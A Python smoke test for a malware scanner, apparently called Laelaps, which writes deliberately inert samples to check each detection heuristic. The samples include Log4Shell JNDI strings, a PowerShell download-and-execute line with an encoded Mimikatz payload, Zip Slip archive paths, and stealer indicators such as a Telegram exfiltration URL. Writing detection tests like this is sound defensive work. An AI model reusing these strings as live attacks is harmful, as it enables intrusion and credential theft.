#!/usr/bin/env python3
"""
Laelaps smoke test - one crafted, BENIGN sample per detection use case.

Every sample here is inert: EICAR-style strings and malformed headers that trip
Laelaps' static heuristics without being real malware (no working payload, no
network callback, no valid executable entrypoint). The test asserts that each of
the nine advertised detection domains actually fires end-to-end, plus score
calibration (a clean file stays clean, and Laelaps' own source is dampened as
"reference content").

Run:  python3 tests/smoke_test.py
Exit: 0 if every use case passes, 1 otherwise.
"""
import os
import subprocess
import sys
import tempfile
import zipfile

# run fully offline + deterministic (no network, no LLM) so the test is hermetic
os.environ["LAELAPS_OFFLINE"] = "1"
os.environ.pop("ANTHROPIC_API_KEY", None)
os.environ.pop("OPENAI_API_KEY", None)

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
import laelaps as L  # noqa: E402

TMP = tempfile.mkdtemp(prefix="laelaps_smoke_")
RESULTS = []


def write(name, data):
    p = os.path.join(TMP, name)
    with open(p, "wb") as f:
        f.write(data if isinstance(data, bytes) else data.encode())
    return p


def check(use_case, cond, detail=""):
    RESULTS.append((use_case, bool(cond), detail))
    mark = "PASS" if cond else "FAIL"
    print(f"  [{mark}] {use_case}" + (f" - {detail}" if detail else ""))
    return bool(cond)


def sig_titles(rep):
    return " || ".join(s.title for s in rep.signals)


def sig_engines(rep):
    return {s.engine for s in rep.signals}


# ---------------------------------------------------------------------------
print("\n=== Laelaps smoke test (offline) ===\n")

# 1. STATIC SIGNATURES - YARA rules + multi-hash ----------------------------
print("1. Static signatures (YARA + hash computation)")
p = write("log4shell.txt",
          'GET /a HTTP/1.1\nUser-Agent: ${jndi:ldap://198.51.100.7:389/Exploit}\n'
          'X: ${jndi:rmi://attacker/a}\nwallet.dat electrum MultiBit\n'
          'metsrv.dll meterpreter stdapi\n')
rep = L.analyze_file_v2(p)
have_hashes = all(k in rep.hashes for k in ("md5", "sha1", "sha256"))
yara_hit = any(s.engine.startswith("deep:yara") or "YARA" in s.title for s in rep.signals) \
    or "T1190" in rep.mitre
check("1a hashes md5/sha1/sha256 computed", have_hashes, ", ".join(rep.hashes))
check("1b YARA/signature match (Log4Shell/Meterpreter)", yara_hit, sig_titles(rep)[:120])
# hash-only reputation path is wired (offline -> structured, no crash)
rh = L.rep_hash(rep.hashes["sha256"])
check("1c hash-only reputation path wired", isinstance(rh, dict) and "virustotal" in rh, str(list(rh)))

# 2. MULTI-ENGINE REPUTATION (wiring + graceful offline) --------------------
print("2. Multi-engine reputation (VT / MalwareBazaar / ThreatFox wiring)")
check("2a reputation lookups degrade gracefully offline",
      isinstance(rh.get("virustotal"), dict), "no crash, dict returned")
check("2b all three intel sources present in hash report",
      all(k in rh for k in ("virustotal", "malwarebazaar", "threatfox")), ", ".join(rh))

# 3. FORMAT-AWARE PARSING (PE / ELF / PDF / archive / image-steg) -----------
print("3. Format-aware parsing")
pe = write("fake.exe", b"MZ" + b"\x90" * 60 + b"PE\x00\x00" +
           b"this program cannot be run in DOS mode " +
           b"VirtualAllocEx WriteProcessMemory CreateRemoteThread")
rpe = L.analyze_file_v2(pe)
check("3a PE detected", rpe.filetype.startswith("PE"), rpe.filetype)

elf = write("fake.elf", b"\x7fELF\x02\x01\x01" + b"\x00" * 9 +
            b"ptrace system execve /bin/sh connect socket")
relf = L.analyze_file_v2(elf)
check("3b ELF detected", relf.filetype.startswith("ELF"), relf.filetype)

pdf = write("evil.pdf", b"%PDF-1.7\n1 0 obj<</OpenAction<</JS(app.alert)/S/JavaScript>>"
            b"/Launch<</F(cmd.exe)>>>>endobj\n/JavaScript /EmbeddedFile\n%%EOF")
rpdf = L.analyze_file_v2(pdf)
check("3c PDF parsed + JS/Launch flagged", "PDF" in rpdf.filetype and
      any("pdf" in s.engine.lower() or "PDF" in s.title for s in rpdf.signals),
      sig_titles(rpdf)[:120])

zp = os.path.join(TMP, "bundle.zip")
with zipfile.ZipFile(zp, "w") as z:
    z.writestr("readme.txt", "hello")
    z.writestr("payload.exe", b"MZ evil dropper")
    z.writestr("../../../tmp/evil.exe", b"MZ zip-slip payload")  # Zip Slip path traversal
rzip = L.analyze_file_v2(zp)
check("3d archive expanded + malicious entry flagged (Zip Slip / inner exe)",
      any("archive" in s.engine.lower() or "archive" in s.title.lower() or
          "traversal" in s.title.lower() or "slip" in s.title.lower() or
          "executable" in s.title.lower() for s in rzip.signals),
      sig_titles(rzip)[:150])
# also confirm the deep engine's archive layer fires directly (medium+ findings)
_arch = L.analyze_file(zp)
check("3d' deep archive layer parses inner entries",
      any(i.layer == "archive" for i in _arch.indicators),
      ", ".join(sorted({i.title for i in _arch.indicators if i.layer == 'archive'}))[:120])

png = write("steg.png", b"\x89PNG\r\n\x1a\n" + b"\x00\x10IDATxxxx" +
            b"IEND\xaeB`\x82" + os.urandom(3000))
rpng = L.analyze_file_v2(png)
check("3e image steganography (trailing data after IEND)",
      any("steg" in s.engine.lower() or "append" in s.title.lower() for s in rpng.signals),
      sig_titles(rpng)[:120])

# 4. STRUCTURAL ANOMALY (entropy / packers) ---------------------------------
print("4. Structural anomaly detection (entropy / packers)")
packed = write("packed.bin", b"UPX!" + b"UPX0UPX1" + os.urandom(9000))
rpk = L.analyze_file_v2(packed)
check("4a packer / high-entropy detected",
      rpk.loaders or any("entropy" in s.title.lower() or "pack" in s.title.lower() or
                         "UPX" in s.title for s in rpk.signals),
      f"loaders={rpk.loaders} | {sig_titles(rpk)[:90]}")

# 5. STRING / IOC EXTRACTION ------------------------------------------------
print("5. String / IOC extraction (URLs, wallets, onion, encoded PS)")
ioc = write("iocs.txt",
            "http://malicious-c2.example/gate.php\n185.220.101.44\n"
            "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n"
            "0x7Fc98a8463D4c0b3E1F19aB3Cf19bE0aB1eCae12\n"
            "http://expyuzz4wqqyqhjn.onion/panel\n"
            "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=\n")
rioc = L.analyze_file_v2(ioc)
have_wallet = ("btc" in rioc.iocs or "eth" in rioc.iocs)
have_onion_or_ps = any("onion" in s.title.lower() or "powershell" in s.title.lower() or
                       "wallet" in s.title.lower() or "crypto" in s.title.lower()
                       for s in rioc.signals) or "onion" in rioc.iocs
check("5a crypto wallet addresses extracted", have_wallet, ", ".join(rioc.iocs))
check("5b onion / encoded-PowerShell / wallet IOC flagged", have_onion_or_ps,
      sig_titles(rioc)[:120])

# 6. BEHAVIORAL INDICATORS (injection trio, keylogger, hollowing) -----------
print("6. Behavioral indicators (API-import heuristics)")
beh = write("inject.exe", b"MZ" + b"\x00" * 40 +
            b"VirtualAllocEx WriteProcessMemory CreateRemoteThread "
            b"NtUnmapViewOfSection SetThreadContext ResumeThread "
            b"SetWindowsHookEx GetAsyncKeyState GetForegroundWindow")
rbeh = L.analyze_file_v2(beh)
check("6a process-injection / hollowing / keylogger heuristics fire",
      "T1055" in rbeh.mitre or any("inject" in s.title.lower() or "hollow" in s.title.lower() or
                                   "keylog" in s.title.lower() for s in rbeh.signals),
      f"mitre={rbeh.mitre[:6]}")

# 7. MACRO / SCRIPT ANALYSIS (PowerShell decode) ----------------------------
print("7. Macro / script analysis (PowerShell + base64 decode)")
# base64 of: IEX (New-Object Net.WebClient).DownloadString('http://x/a')
import base64 as _b64
blob = _b64.b64encode(
    "IEX (New-Object Net.WebClient).DownloadString('http://x/a'); Invoke-Mimikatz".encode()).decode()
ps = write("dropper.ps1",
           "$ErrorActionPreference='SilentlyContinue'\n"
           "IEX (New-Object Net.WebClient).DownloadString('http://evil/x')\n"
           "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + blob + "\n"
           "[Convert]::FromBase64String('" + blob + "')\n")
rps = L.analyze_file_v2(ps)
check("7a PowerShell script + base64 payload analysis",
      any("script" in s.engine.lower() or "PowerShell" in s.title or "Invoke" in s.title or
          "Base64" in s.title or "base64" in s.title.lower() for s in rps.signals),
      sig_titles(rps)[:120])

# 8. VULNERABILITY / CVE TRIGGERS -------------------------------------------
print("8. Vulnerability / exploit triggers (Log4Shell, Follina, EternalBlue)")
cve = write("exploits.txt",
            "${jndi:ldap://127.0.0.1:1389/o}\n"
            "ms-msdt:/id PCWDiagnostic\nMSDTJS IT_BrowseForFile\n"
            "EternalBlue MS17-010 buffer\nPrintNightmare spoolsv\n")
rcve = L.analyze_file_v2(cve)
cve_mitre = set(rcve.mitre)
check("8a CVE/exploit signatures mapped to ATT&CK",
      bool(cve_mitre & {"T1190", "T1203", "T1210", "T1068"}) or
      any("log4" in s.title.lower() or "follina" in s.title.lower() or
          "eternalblue" in s.title.lower() for s in rcve.signals),
      f"mitre={sorted(cve_mitre)[:6]}")

# 9. THREAT-INTEL CORRELATION - the LummaC2 / Electron showcase --------------
print("9. Threat-intel correlation (family attribution + capability + C2 + brand)")
lumma = write("VSCode-Setup.exe",
              # Electron wrapper markers
              "electron app.asar node_modules resources\\app chrome_100_percent.pak\n"
              # LummaC2 family markers
              "LummaC2 lid=9182 soft_id=42 lumma build\n"
              # credential/wallet targets
              "\\Google\\Chrome\\User Data\\Default\\Login Data\n"
              "logins.json key4.db cookies.sqlite\n"
              "wallet.dat exodus electrum metamask nkbihfbeogaeaoehlefnkodbefgpgknn\n"
              "\\Telegram Desktop\\tdata discord token\n"
              # C2 / exfil
              "https://steamcommunity.com/profiles/76561199000000000\n"
              "https://api.telegram.org/bot123456789:AAF_kd9slUabcdefgh_ZZ0000000000000/sendDocument\n"
              # clipboard + recon
              "SetClipboardData GetClipboardData GetComputerName machineguid\n"
              # brand-impersonation distribution
              "https://setup-code.com/VSCode-Setup.exe https://code-setup.com/update\n")
rl = L.analyze_file_v2(lumma)
fam_names = [f.family for f in rl.families]
caps = set(rl.capabilities)
c2_chans = [c["channel"] for c in rl.c2]
brands = [b["host"] for b in rl.brand_impersonation]
check("9a verdict = malicious", rl.verdict == "malicious", f"score={rl.score}")
check("9b family attributed (Lumma / Electron-stealer)",
      any("Lumma" in f or "Electron" in f for f in fam_names), ", ".join(fam_names[:4]) or "none")
check("9c capabilities profiled (browser + wallet theft)",
      "Browser credential theft" in caps and "Crypto wallet theft" in caps, ", ".join(sorted(caps))[:120])
check("9d C2 fingerprinted (Telegram / Steam dead-drop)",
      any("Telegram" in c or "Steam" in c for c in c2_chans), "; ".join(c2_chans[:4]) or "none")
check("9e brand-impersonation domains flagged",
      any("setup-code.com" in b or "code-setup.com" in b for b in brands), ", ".join(brands) or "none")
check("9f MITRE ATT&CK correlated", len(rl.mitre) >= 3, f"{len(rl.mitre)} techniques")
check("9g analyst threat-report generated",
      "Threat Analysis Report" in rl.report_md and "Attribution" in rl.report_md,
      f"{len(rl.report_md)} chars")
one_liner = L.build_one_liner(rl.families, rl.capabilities, rl.loaders,
                              rl.brand_impersonation, rl.c2)
check("9h report one-liner reads like a threat brief",
      "steals" in one_liner.lower() or "credential" in one_liner.lower(), one_liner[:130])
# LLM layer wiring (offline -> gracefully skipped, no crash)
check("9i LLM verdict layer degrades gracefully offline", rl.llm_summary is None, "skipped offline")

# URL scanner - fake-installer delivery pattern -----------------------------
print("URL scanner (brand-impersonation + direct payload)")
ur = L.scan_url("https://setup-code.com/VSCode-Setup.exe", deep=False)
check("U1 URL verdict malicious/suspicious", ur["verdict"] in ("malicious", "suspicious"),
      f"verdict={ur['verdict']} score={ur['score']}")
check("U2 fake-installer / brand-impersonation detected",
      any("installer" in s["title"].lower() or "brand" in s["title"].lower() or
          "impersonation" in s["title"].lower() for s in ur["signals"]),
      "; ".join(s["title"] for s in ur["signals"][:4]))

# Calibration ----------------------------------------------------------------
print("Calibration (false-positive control)")
clean = write("notes.txt",
              "Meeting notes. Buy milk. The quarterly report is due Friday. "
              "Remember to water the plants and call the dentist.\n" * 5)
rc = L.analyze_file_v2(clean)
check("C1 clean file stays clean/unknown", rc.verdict in ("clean", "unknown"),
      f"verdict={rc.verdict} score={rc.score}")
rself = L.analyze_file_v2(os.path.join(ROOT, "laelaps.py"))
check("C2 detection tool's own source dampened as reference content",
      rself.reference_only and rself.verdict != "malicious",
      f"reference_only={rself.reference_only} verdict={rself.verdict}")

# CLI / exit codes (subprocess) ---------------------------------------------
print("CLI end-to-end (subprocess exit codes + output modes)")
env = dict(os.environ, LAELAPS_OFFLINE="1")


def run_cli(args):
    return subprocess.run([sys.executable, os.path.join(ROOT, "laelaps.py"), *args],
                          capture_output=True, text=True, env=env, timeout=180)

r = run_cli([lumma, "--offline", "--report", "--no-llm"])
check("CLI1 malicious sample -> exit 1 + report", r.returncode == 1 and
      "Threat Analysis Report" in r.stdout, f"rc={r.returncode}")
r = run_cli([clean, "--offline", "--json", "--no-llm"])
import json as _json
try:
    ok_json = _json.loads(r.stdout)["verdict"] in ("clean", "unknown")
except Exception:
    ok_json = False
check("CLI2 clean sample -> exit 0 + valid JSON", r.returncode == 0 and ok_json, f"rc={r.returncode}")
r = run_cli([rep.hashes["sha256"], "--offline"])
check("CLI3 hash arg -> reputation JSON, exit 0", r.returncode == 0 and "virustotal" in r.stdout,
      f"rc={r.returncode}")
r = run_cli(["--url", "https://setup-code.com/VSCode-Setup.exe", "--offline"])
check("CLI4 --url scan -> non-zero verdict exit", r.returncode == 1, f"rc={r.returncode}")

# ---------------------------------------------------------------------------
passed = sum(1 for _, ok, _ in RESULTS if ok)
total = len(RESULTS)
print(f"\n=== {passed}/{total} checks passed ===")
if passed != total:
    print("FAILURES:")
    for uc, ok, det in RESULTS:
        if not ok:
            print(f"  - {uc}: {det}")
    sys.exit(1)
print("ALL USE CASES PASS")
sys.exit(0)
